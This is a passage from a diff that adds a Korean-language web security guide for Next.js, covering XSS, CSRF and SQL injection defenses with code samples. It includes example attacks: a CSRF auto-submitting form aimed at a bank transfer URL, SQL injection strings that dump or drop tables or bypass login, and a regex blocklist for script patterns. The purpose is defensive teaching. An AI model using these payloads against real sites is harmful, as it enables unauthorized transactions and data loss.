+        source: "/:path*",
+        headers: [
+          {
+            key: "Content-Security-Policy",
+            value: cspHeader.replace(/\s{2,}/g, " ").trim(),
+          },
+        ],
+      },
+    ];
+  },
+};
+
+// 4. 입력 검증
+function validateInput(input) {
+  // 특수 문자 제한
+  if (/<script|javascript:|on\w+=/i.test(input)) {
+    throw new Error("Invalid input");
+  }
+  return input;
+}
+
+// 5. HttpOnly Cookie
+cookies().set("session", token, {
+  httpOnly: true, // JS로 접근 불가
+  secure: true,
+  sameSite: "strict",
+});
+```
+
+**2. CSRF (Cross-Site Request Forgery)**
+
+**개념:** 사용자가 의도하지 않은 요청을 보내도록 만드는 공격
+
+**공격 예시:**
+
+```html
+<!-- 공격자 사이트 (attacker.com) -->
+<img src="https://bank.com/transfer?to=attacker&amount=10000" />
+<!-- 사용자가 bank.com에 로그인 상태면 자동 실행 -->
+
+<form action="https://bank.com/transfer" method="POST">
+  <input type="hidden" name="to" value="attacker" />
+  <input type="hidden" name="amount" value="10000" />
+</form>
+<script>
+  document.forms[0].submit();
+</script>
+```
+
+**방어 방법:**
+
+```jsx
+// 1. CSRF 토큰
+// 서버: 토큰 생성 및 세션에 저장
+import { randomBytes } from "crypto";
+
+function generateCsrfToken() {
+  return randomBytes(32).toString("hex");
+}
+
+// 페이지 렌더링 시 토큰 포함
+<form method="POST" action="/transfer">
+  <input type="hidden" name="csrf_token" value={csrfToken} />
+  <input type="text" name="to" />
+  <input type="number" name="amount" />
+  <button type="submit">Transfer</button>
+</form>;
+
+// 서버: 토큰 검증
+export async function POST(request) {
+  const formData = await request.formData();
+  const csrfToken = formData.get("csrf_token");
+  const sessionToken = getSessionToken(request);
+
+  if (csrfToken !== sessionToken) {
+    return NextResponse.json({ error: "Invalid CSRF token" }, { status: 403 });
+  }
+
+  // 요청 처리
+}
+
+// 2. SameSite Cookie
+cookies().set("session", sessionId, {
+  sameSite: "strict", // 다른 사이트에서 자동 전송 안됨
+  // 'lax': GET 요청만 허용
+  // 'none': 모든 요청 허용 (Secure 필수)
+});
+
+// 3. Origin/Referer 확인
+export async function POST(request) {
+  const origin = request.headers.get("origin");
+  const referer = request.headers.get("referer");
+
+  const allowedOrigins = ["https://myapp.com", "https://www.myapp.com"];
+
+  if (!origin || !allowedOrigins.includes(origin)) {
+    return NextResponse.json({ error: "Forbidden" }, { status: 403 });
+  }
+
+  // 요청 처리
+}
+
+// 4. Double Submit Cookie
+// 쿠키와 요청 본문에 같은 토큰 전송
+cookies().set("csrf-token", token);
+
+fetch("/api/transfer", {
+  method: "POST",
+  headers: {
+    "X-CSRF-Token": token, // 쿠키와 동일한 값
+  },
+  body: JSON.stringify(data),
+});
+
+// 서버: 두 값이 일치하는지 확인
+const cookieToken = cookies().get("csrf-token");
+const headerToken = request.headers.get("x-csrf-token");
+
+if (cookieToken !== headerToken) {
+  return NextResponse.json({ error: "Invalid token" }, { status: 403 });
+}
+```
+
+**3. SQL Injection**
+
+**개념:** SQL 쿼리에 악의적인 코드를 주입하는 공격
+
+**공격 예시:**
+
+```jsx
+// ❌ 위험한 쿼리
+const userId = req.query.id; // "1 OR 1=1"
+const query = `SELECT * FROM users WHERE id = ${userId}`;
+// 결과: SELECT * FROM users WHERE id = 1 OR 1=1
+// 모든 사용자 정보 조회됨
+
+// ❌ 더 위험한 공격
+const userId = "1; DROP TABLE users; --";
+const query = `SELECT * FROM users WHERE id = ${userId}`;
+// 결과: users 테이블 삭제
+
+// ❌ 로그인 우회
+const username = "admin' --";
+const password = "anything";
+const query = `
+  SELECT * FROM users 
+  WHERE username = '${username}' AND password = '${password}'
+`;
+// 결과: SELECT * FROM users WHERE username = 'admin' --' AND password = '...'
+// 비밀번호 체크 무시됨
+```
+
+**방어 방법:**
+
+```jsx
+// 1. ✅ Prepared Statement (Parameterized Query)
+// PostgreSQL
+const userId = req.query.id;
+const query = "SELECT * FROM users WHERE id = $1";
+const result = await db.query(query, [userId]);
+
+// MySQL
+const query = "SELECT * FROM users WHERE id = ?";
+const [rows] = await db.execute(query, [userId]);
+
+// 2. ✅ ORM 사용 (Prisma)
+import { PrismaClient } from "@prisma/client";
+const prisma = new PrismaClient();
+
+const userId = req.query.id;
+const user = await prisma.user.findUnique({
+  where: { id: userId }, // 자동으로 안전하게 이스케이프
+});
+
+// 3. ✅ 입력 검증
+import { z } from "zod";
+
+const userIdSchema = z.number().int().positive();
+
+try {
+  const userId = userIdSchema.parse(Number(req.query.id));
+  // 타입이 안전함
+} catch (error) {
+  return NextResponse.json({ error: "Invalid ID" }, { status: 400 });
+}
+
+// 4. ✅ Whitelist 방식
+const allowedFields = ["name", "email", "created_at"];
+const sortField = req.query.sort;
+
+if (!allowedFields.includes(sortField)) {
+  throw new Error("Invalid sort field");
+}
+
+const query = `SELECT * FROM users ORDER BY ${sortField}`;
+
+// 5. ✅ 최소 권한 원칙
+// DB 사용자에게 필요한 권한만 부여
+// - SELECT, INSERT, UPDATE만
+// - DROP, CREATE TABLE 권한 제거
+```
+
+**종합 보안 체크리스트:**
+
+```jsx
+// ✅ 1. 사용자 입력 검증 및 Sanitize
+function validateAndSanitize(input) {
+  // 타입 검증
+  const schema = z.string().max(100);
+  const validated = schema.parse(input);
+
+  // HTML Sanitize
+  return DOMPurify.sanitize(validated);
+}
+
+// ✅ 2. HTTPS 사용
+// next.config.js
+module.exports = {
+  async redirects() {
+    return [{
+      source: '/:path*',
+      has: [{ type: 'header', key: 'x-forwarded-proto', value: 'http' }],
+      destination: 'https://example.com/:path*',
+      permanent: true
+    }];
+  }
+};
+
+// ✅ 3. 보안 헤더 설정
+module.exports = {
+  async headers() {
+    return [{
+      source: '/:path*',
+      headers: [
+        { key: 'X-Frame-Options', value: 'DENY' }, // Clickjacking 방어
+        { key: 'X-Content-Type-Options', value: 'nosniff' },
+        { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
+        { key: 'Permissions-Policy', value: 'camera=(), microphone=(), geolocation=()' },
+        { key: 'Content-Security-Policy', value: cspHeader },
+      ]
+    }];
+  }
+};
+
+// ✅ 4. Rate Limiting
+import { Ratelimit } from '@upstash/ratelimit';
+
+const ratelimit = new Ratelimit({
+  redis: redis,
+  limiter: Ratelimit.slidingWindow(10, '10 s')
+});
+
+export async function POST(request) {
+  const ip = request.ip ?? '127.0.0.1';
+  const { success } = await ratelimit.limit(ip);
+
+  if (!success) {
+    return NextResponse.json(
+      { error: 'Too many requests' },
+      { status: 429 }
+    );
+  }
+
+  // 요청 처리
+}
+
+// ✅ 5. 민감한 데이터 암호화
+import bcrypt from 'bcrypt';
+
+// 비밀번호 해싱
+const hashedPassword = await bcrypt.hash(password, 10);
+
+// 비밀번호 검증
+const isValid = await bcrypt.compare(password, hashedPassword);
+
+// ✅ 6. 환경 변수 보호
+// .env.local
+DATABASE_URL=...
+SECRET_KEY=...
+
+// 절대 클라이언트로 노출하지 않기
+// NEXT_PUBLIC_ 접두사 주의
+
+// ✅ 7. 정기적인 보안 감사
+// npm audit
+// npm audit fix
+
+// 의존성 업데이트
+// npm outdated
+// npm update
+```
